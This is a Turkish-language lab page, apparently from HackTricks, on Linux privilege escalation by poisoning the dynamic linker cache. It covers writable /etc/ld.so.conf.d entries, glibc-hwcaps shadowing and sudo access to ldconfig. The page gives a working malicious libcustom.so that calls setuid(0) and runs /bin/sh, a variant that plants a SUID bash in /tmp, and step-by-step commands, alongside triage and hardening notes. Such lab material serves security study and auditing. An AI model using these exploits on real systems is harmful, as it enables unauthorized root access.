# ld.so privesc exploit example

{{#include ../../banners/hacktricks-training.md}}

Bu sayfa, **`/etc/ld.so.conf` veya `ldconfig` üzerinden system linker cache poisoning** için hazırlanmış odaklı bir laboratuvardır. Eksik library injection, yazılabilir `RPATH`/`RUNPATH`, `LD_PRELOAD` ve diğer generic SUID linker abuse konuları için [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md) sayfasına bakın.

## Ortamı hazırlama

Aşağıdaki bölümde, ortamı hazırlamak için kullanacağımız dosyaların kodunu bulabilirsiniz.

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. Aynı klasörde bu dosyaları makinenizde **oluşturun**
2. **library**'yi **derleyin**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. `libcustom.so` dosyasını `/usr/lib` konumuna **kopyalayın** ve önbelleği yenileyin: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root ayrıcalıkları)
4. **executable**'ı **derleyin**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Ortamı kontrol edin

_libcustom.so_ dosyasının _/usr/lib_ konumundan **yüklendiğini** ve binary'yi **çalıştırabildiğinizi** kontrol edin.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Faydalı triage komutları

Gerçek bir hedefe saldırırken, binary'nin ihtiyaç duyduğu **tam library adını**, loader'ın **şu anda çözümlediği** library'yi ve canlı cache'i değiştirmeden hangi yapılandırılmış yolların yazılabilir olduğunu doğrulayın.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
`ldd` yalnızca **güvenilir** bir executable üzerinde kullanılmalıdır. Bazı implementasyonlar veya alışılmadık ELF interpreter'ları, attacker-controlled code çalıştırılmasına neden olabilir; `objdump -p ./file | grep NEEDED` direct dependencies listesini güvenli şekilde gösterir. Güvenilir bir target için, tespit edilen interpreter'ı `--list` ile çalıştırmak actual resolution'ı gösterir.<sup>[[4]](#references)</sup>

Birkaç useful gotcha:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` genellikle **çalışmaz**, çünkü redirection mevcut shell'iniz tarafından yapılır. Bunun yerine
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf` kullanın.
- **SUID/privileged** binary'ler **secure-execution mode** ile çalışır: `LD_LIBRARY_PATH`
yok sayılır; `LD_PRELOAD` ise kısıtlanır (slash içeren isimler yok sayılır ve yalnızca standard directories içindeki setuid-marked library'ler preload edilebilir). Root `ldconfig` çalıştırdığında, `/etc/ld.so.conf` içinde listelenen directories `/etc/ld.so.cache` içine girebilir; dolayısıyla bu misconfiguration privileged program'ları yine de etkileyebilir.<sup>[[1]](#references)[[2]](#references)</sup>
- `LD_DEBUG`, `/etc/suid-debug` mevcut olmadığı sürece secure-execution mode'da da yok sayılır; bu nedenle privileged execution'dan output beklemek yerine trace'i equivalent non-SUID run'dan toplayın.<sup>[[1]](#references)</sup>
- glibc 2.33 ve daha yeni sürümlerde dynamic loader ayrıca
`--list-diagnostics` seçeneğini sunar. Bu seçenek, bir hijack beklenildiği gibi davranmadığında machine-readable loader diagnostics ve built-in search-path bilgilerini yazdırır.<sup>[[1]](#references)[[6]](#references)</sup>

### Cache and SONAME constraints

`ldconfig`, configured directory içindeki her arbitrary file'ı cache'lemez: ELF header'larını inceler, `lib*.so*` veya `ld-*.so*` ile eşleşen isimleri tanır ve geleneksel `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12` chain'ini bekler. Bu nedenle injected object'ın target architecture/class'a, exact `DT_NEEDED` name'e (normalde `DT_SONAME`) ve victim'ın resolve ettiği tüm symbol/version'lara sahip olması gerekir.<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
Bu örnekteki gibi target-specific bir library tercih edin. Yaygın bir SONAME'i eksik bir object ile shadowing etmek, hedeflenen privileged target çalışmadan önce bu SONAME'i çözen tüm process'leri bozabilir.<sup>[[3]](#references)</sup>

## Exploit

Bu senaryoda, bir administrator'ın sistemin
`/etc/ld.so.conf` dosyası tarafından dahil edilen
`/etc/ld.so.conf.d/` altındaki bir dosyaya vulnerable bir entry
eklediğini varsayalım.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Vulnerable klasör _/home/ubuntu/lib_ (yazma erişimimizin olduğu yer).\
Aşağıdaki kodu bu yolun içinde **indirin ve derleyin**:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Daha sonra **root** (veya başka bir yetkili hesabın) vulnerable binary'yi çalıştırmasını bekliyorsanız, genellikle interactive shell başlatmak yerine **root-owned artifact** bırakmak daha iyidir. Örneğin:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Ardından, ayrıcalıklı çalıştırma gerçekleştiğinde `/tmp/rootbash -p` komutunu kullanabilirsiniz.

Artık **kötü amaçlı libcustom kütüphanesini yanlış yapılandırılmış** yolun içine **oluşturduğumuza** göre, varsayılan önbellek başarılı bir ayrıcalıklı **`ldconfig`** çalıştırmasıyla yeniden oluşturulmalıdır. Yeniden başlatma yalnızca yerel önyükleme işlemi bunu gerçekten çağırıyorsa yardımcı olur; aksi takdirde bir yönetici işlemini bekleyin veya mevcutsa güvenli olmayan bir sudo kuralı kullanın.<sup>[[2]](#references)</sup>

Bu gerçekleştikten sonra, `sharedvuln` çalıştırılabilir dosyasının `libcustom.so` kütüphanesini nereden yüklediğini **yeniden kontrol edin**:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Gördüğünüz gibi **`/home/ubuntu/lib` konumundan yüklüyor** ve herhangi bir kullanıcı bunu çalıştırırsa bir shell çalıştırılacak:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Bu örnekte henüz yetkileri yükseltmediğimizi unutmayın; ancak yürütülen komutları değiştirerek ve **root veya başka bir ayrıcalıklı kullanıcının güvenlik açığı bulunan binary'yi çalıştırmasını bekleyerek** yetkileri yükseltebiliriz.

### Modern `glibc-hwcaps` gölgelemesi

glibc 2.33'ten beri loader, **her kütüphane arama dizini** içindeki `glibc-hwcaps/<level>/` altında bulunan optimize edilmiş kütüphaneleri tercih edebilir. Sonuç olarak yalnızca `/home/ubuntu/lib` dizinini kontrol etmek yeterli değildir: `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/` gibi yazılabilir ve uyumlu bir alt dizin, `ldconfig` bu dizini indeksledikten sonra temel kütüphaneyi gölgeleyebilir; diğer CPU'lar ise temel nesneyi kullanmaya devam eder. Bu ayrıca, doğrulama farklı bir CPU üzerinde gerçekleştirildiğinde gözden kaçabilecek, mimariye özgü bir hijack sağlar.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
Mevcut glibc hardening yönergeleri, yinelenen SONAME'lerden, varsayılan olmayan arama konumlarından ve `glibc-hwcaps` alt dizinlerindeki object'lerden kaçınılmasını önerir. Audit açısından, yapılandırılmış dizinlere ve bunların üst path bileşenlerine recursive olarak ownership ve writeability kontrolleri uygulayın.<sup>[[3]](#references)</sup>

### Diğer yanlış yapılandırmalar - Aynı zafiyet

Önceki örnekte, bir yöneticinin **bir configuration file içinde `/etc/ld.so.conf.d/` altında ayrıcalıksız bir folder tanımladığı** bir yanlış yapılandırmayı taklit ettik.\
Ancak aynı zafiyete yol açabilecek başka yanlış yapılandırmalar da vardır: yüklenen bir **config file** üzerinde **write permissions**'ınız varsa, yazılabilir bir `/etc/ld.so.conf.d/` directory'si içinde bir file oluşturabiliyorsanız veya `/etc/ld.so.conf` üzerine yazabiliyorsanız, aynı zafiyeti yapılandırabilir ve exploit edebilirsiniz.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit 2

**`ldconfig` üzerinde sudo privileges sahibi olduğunuzu varsayalım**.\
`-f` ile **`ldconfig`'e hangi configuration file'ı okuyacağını** belirtebilirsiniz; bu nedenle attacker-controlled directory'leri belirten bir file, `ldconfig`'in bu folder'ları cache'e eklemesini sağlayabilir.<sup>[[2]](#references)</sup>\
Öyleyse `"/tmp"`'yi load etmek için gereken file ve folder'ları oluşturalım:
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Şimdi, **previous exploit** içinde belirtildiği gibi, **kötücül library'yi `/tmp` içinde oluşturun**.\
Son olarak path'i yükleyelim ve binary'nin library'yi nereden yüklediğini kontrol edelim:
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Gördüğünüz gibi, `ldconfig` üzerinde sudo ayrıcalıklarına sahip olarak aynı güvenlik açığından yararlanabilirsiniz.** Kısıtlanmış bir sudo kuralını değerlendirirken seçenek ayrıntıları önemlidir: `-f` başka bir yapılandırma seçer, ancak `/etc/ld.so.cache` dosyasını yine de yeniden oluşturur; `-C` önbelleği başka bir konuma yönlendirir; `-N` önbelleğin yeniden oluşturulmasını engeller; `-X` ise bağlantı güncellemelerini engeller, ancak **`-N` ile birlikte kullanılmadığı sürece önbelleği yine de yeniden oluşturur**.<sup>[[2]](#references)</sup>



## References

- [1] [ld.so(8) - Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Dinamik Linker Güçlendirmesi - GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - Linux kılavuz sayfası](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [5] [readelf (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
- [6] [Dinamik Linker Tanılaması (GNU C Library)](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
{{#include ../../banners/hacktricks-training.md}}
